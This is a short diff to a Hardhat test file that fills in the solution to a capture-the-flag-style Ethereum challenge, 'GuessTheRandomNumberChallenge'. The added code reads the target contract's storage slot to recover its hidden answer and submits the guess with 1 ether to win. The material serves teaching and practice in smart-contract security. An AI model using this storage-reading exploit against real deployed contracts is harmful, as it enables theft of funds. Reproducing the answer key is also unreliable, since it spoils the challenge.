@@ -1,6 +1,7 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
 import { Contract } from 'ethers';
+import { formatBytes32String, hexlify } from 'ethers/lib/utils';
 import { ethers, network } from 'hardhat';
 const { utils, provider } = ethers;
 
@@ -24,9 +25,8 @@ describe('GuessTheRandomNumberChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const answer = parseInt(await provider.getStorageAt(target.address, 0));
+    await target.guess(answer, { value: utils.parseEther('1') });
 
     expect(await target.isComplete()).to.equal(true);
   });
